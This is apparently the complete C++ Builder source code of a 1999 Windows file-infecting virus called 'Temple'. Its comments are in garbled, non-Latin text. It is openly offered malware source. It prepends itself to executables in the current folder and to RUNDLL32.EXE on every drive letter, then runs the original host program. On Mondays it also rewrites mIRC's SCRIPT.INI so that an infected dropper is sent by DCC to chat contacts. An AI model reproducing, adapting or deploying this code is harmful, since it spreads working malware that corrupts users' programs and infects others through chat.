
#define DEBUG 0
#define VIRLEN 11264          // ����� ��� ����������� ������ !!!

//---------------------------------------------------------------------------
#include <vcl.h>
#include <stdio.h>
#include <dir.h>
#include <io.h>
#include <sys/stat.h>
#include <fcntl.h>


#pragma hdrstop

#include "Main.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;

int iMyHandle;
byte *mybuf;
char Templ[]="Temple.$_$";

extern bool InfectFile(char*,bool);
extern int  mstrncmp(char*,char*,int);
extern void InfectIrc();

//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FormCreate(TObject *Sender)
{
   struct ffblk ffblk;
   int done,i,iTmpHandle,chInf=0;
   byte *buf;

   char *Win95Path="C:\\WINDOWS\\RUNDLL32.EXE";
   char *WinNTPath="C:\\WINNT\\RUNDLL32.EXE";

   if(!mstrncmp(DateToStr(Date()).c_str(),"15.04",5))		// ������� �������
    MessageBox(0, "Copyright (c) by Wit AKA CyberViper 1999.",  
               "Virus -=Temple=- Build 002", MB_OK);

   iMyHandle=open(Application->ExeName.c_str(),O_RDONLY | O_BINARY);
   mybuf=new byte[VIRLEN+1];
   read(iMyHandle, mybuf, VIRLEN);

#if DEBUG == 0
   if(Date().DayOfWeek()==1)           // �� ������������ ���������� ���� � MIRC
     InfectIrc();
#endif

   done = findfirst("*.exe",&ffblk,0);
   while (!done && chInf<3)                     // 3 ����� � ������� ��������
    {
      if(InfectFile(ffblk.ff_name,false))
       chInf++;
      done = findnext(&ffblk);
    }

#if DEBUG == 0
    do
     {
      if(!findfirst(Win95Path,&ffblk,0))                // Rundll32.exe �� ���� ������
       InfectFile(Win95Path,false);                     // (����� ������� ��������� :) )
      if(!findfirst(WinNTPath,&ffblk,0))
       InfectFile(WinNTPath,false);
      Win95Path[0]++;
      WinNTPath[0]++;
     }while(Win95Path[0]!='Z'+1);
#endif

    i=lseek(iMyHandle,0,SEEK_END);              // ��������� ��������
    i-=VIRLEN;
    if (i)                              // �.�. ��� �� �������
     {
      String  RunName,RunNameArg;

      RunName=Application->ExeName;
      RunName.c_str()[StrLen(Application->ExeName.c_str())-1]='_';
      DeleteFile(RunName);
      chmod(RunName.c_str(),S_IREAD | S_IWRITE);
      if((iTmpHandle=open(RunName.c_str(),O_RDWR|O_CREAT|O_BINARY))!=-1)
       {
        lseek(iMyHandle,VIRLEN,SEEK_SET);          // �������� �������� �� 
        buf=new byte[i+1];                         // ��������� ����
        read(iMyHandle,buf,i);
        write(iTmpHandle,buf,i);
        close(iTmpHandle);
        close(iMyHandle);
        chmod(RunName.c_str(),S_IREAD | S_IWRITE);
        delete buf;
        RunNameArg=RunName;
        RunNameArg+="  ";
        RunNameArg+=cmdline;

        STARTUPINFO si;                             // ��������� ��������
        PROCESS_INFORMATION pi;
        si.cb=sizeof(STARTUPINFO);
        si.wShowWindow=SW_SHOWNORMAL;
        si.dwFlags=STARTF_USESHOWWINDOW;
        if(CreateProcess(NULL,
                   RunNameArg.c_str(),
                   NULL,
                   NULL,
                   FALSE,
                   CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS,
                   NULL,
                   NULL,
                   &si,
                   &pi)==TRUE)
        {
          CloseHandle(pi.hThread);                    // ����������� �������
          WaitForSingleObject(pi.hProcess, INFINITE); // ���� ���������� ��������
          CloseHandle(pi.hProcess);                   // ����������� �������
        }
        DeleteFile(RunName);
       }
      else  // �� ������ ������� ��������� ����
       MessageDlg("Don't create temporary file.",mtError,TMsgDlgButtons() << mbOK,
                  NULL);
     }
   }

 bool InfectFile(char *FileName,bool drop)
 {
  // ���������� ���� ( ���� drop=true, �� ������� ������� )
 int FileLenght;
 int iFileHandle,iTmpHandle;
 byte *buf;
 bool ret=false;
 if((iFileHandle=open(FileName, O_RDWR  | O_BINARY)) != -1)
  {
   FileLenght=filelength(iFileHandle);
   if (FileLenght <= 1000000)
    {
     buf=new byte[FileLenght+1];
     read(iFileHandle, buf, FileLenght);
     if(((buf[0]=='M' && buf[1]=='Z') ||(buf[0]=='Z' && buf[1]=='M')) || drop)
      {
// ��������� �� PE EXE ��� NE EXE
       if((buf[0x18]>=0x40
       && (buf[buf[0x3d]*0x100+buf[0x3c]] == 'P' || buf[buf[0x3d]*0x100+buf[0x3c]] == 'N')
       && buf[buf[0x3d]*0x100+buf[0x3c]+1] == 'E') || drop)
        {
         if(mstrncmp(buf,mybuf,0x300))
          {
           DeleteFile(Templ);
           chmod(Templ,S_IREAD | S_IWRITE);
           if((iTmpHandle=open(Templ,O_RDWR|O_CREAT|O_BINARY))!=-1)
            {
             write(iTmpHandle,mybuf,VIRLEN);
             write(iTmpHandle,buf,FileLenght);
             close(iTmpHandle);
             chmod(FileName,S_IWRITE);
             close(iFileHandle);
             DeleteFile(AnsiString(FileName));
             rename(Templ,FileName);
             chmod(FileName,S_IREAD | S_IWRITE);
             ret=true;
            }
          }
        }
      }
     delete buf;
    }
   close(iFileHandle);
  }
  return ret;
 }

  int mstrncmp(char *one,char *two,int len)
 {
  // ��������� ����� ( �����-�� ��� ����������� �� �����������:)) 
   while(len-->=0)
    {
     if(one[len]!=two[len])
       return -1;
    }
   return 0;
 }

void InfectIrc()
 {
// ��������� ������� � MIRC ������
   char *Dropper="C:\\WINDOWS\\WINTEST.EXE";
   String PathMirc[]={"C:\\MIRC",
                      "C:\\MIRC32",
                      "C:\\PROGRA~1\\MIRC",
                      "C:\\PROGRA~1\\MIRC32"
                     };
   String ScriptFile,ScriptTxt="[script]\n"
 "n0=on 1:FILESENT:*.*:if ( $me != $nick ) { /dcc send $nick c:\\windows\\wintest.exe }\n"
 "n1=on 1:FILERCVD:*.*:if ( $me != $nick ) { /dcc send $nick c:\\windows\\wintest.exe }\n";

   int iTmpHandle;
   DeleteFile(Dropper);
   if((iTmpHandle=open(Dropper,O_RDWR|O_CREAT|O_BINARY))!=-1) // ������� ������� ���
    {                                                         // ��������� �� IRC
     close(iTmpHandle);
     chmod(Dropper,S_IREAD | S_IWRITE);
     InfectFile(Dropper,true);
     for(int i=0;i<4;i++)                         // ����������� � ini-�����
      {                                           // �������� �������� ����
       ScriptFile=PathMirc[i]+"\\SCRIPT.INI";     // ���� ���������� � �� ����
       if(!access(ScriptFile.c_str(),0))          // �������� ����� �� IRC
        {
         DeleteFile(ScriptFile);
         iTmpHandle=open(ScriptFile.c_str(),O_RDWR|O_CREAT|O_TEXT);
         write(iTmpHandle,ScriptTxt.c_str(),ScriptTxt.Length());
         close(iTmpHandle);
         chmod(ScriptFile.c_str(),S_IREAD | S_IWRITE);
        }
      }
    }
 }

//---------------------------------------------------------------------------

